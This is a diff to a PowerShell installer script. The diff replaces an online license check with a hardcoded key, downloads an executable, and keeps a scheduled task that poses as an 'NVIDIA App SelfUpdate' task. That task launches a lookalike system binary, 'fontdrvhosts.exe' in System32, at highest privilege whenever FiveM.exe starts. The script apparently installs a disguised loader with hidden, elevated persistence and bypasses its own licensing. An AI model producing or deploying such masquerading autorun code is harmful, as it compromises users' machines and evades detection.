@@ -30,29 +30,17 @@ $taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 # Install Mode
 # -----------------------------
 if ($choice -eq "1") {
-    # --- ส่วนที่เพิ่มเข้ามาใหม่: ตรวจสอบ License ---
-    $userKey = Read-Host "Enter License Key"
-    $hwid = (Get-CimInstance Win32_Processor).ProcessorId
-    $payload = @{ key = $userKey; hwid = $hwid } | ConvertTo-Json
-    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $payload -ContentType "application/json"
-    
-    if ($response -ne "Success") {
-        Write-Host "License Invalid: $response" -ForegroundColor Red
-        Read-Host "Press Enter to exit"
-        exit
-    }
-    Write-Host "License Verified!" -ForegroundColor Green
-    # ----------------------------------------
+Write-Host "Starting installation..."
+Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+$key = "123"
+$regPath = "HKCU:\Software\NVIDIAApp"
 
-    Write-Host "Starting installation..."
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
-    
-    $regPath = "HKCU:\Software\NVIDIAApp"
-    $regName = "LicenseKey"
-    if (-not (Test-Path $regPath)) {
-        New-Item -Path $regPath -Force | Out-Null
-    }
-    Set-ItemProperty -Path $regPath -Name $regName -Value $userKey
+$regName = "LicenseKey"
+if (-not (Test-Path $regPath)) {
+
+New-Item -Path $regPath -Force | Out-Null
+}
+Set-ItemProperty -Path $regPath -Name $regName -Value $key
 
     # Create scheduled task
     $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /rl HIGHEST /f'
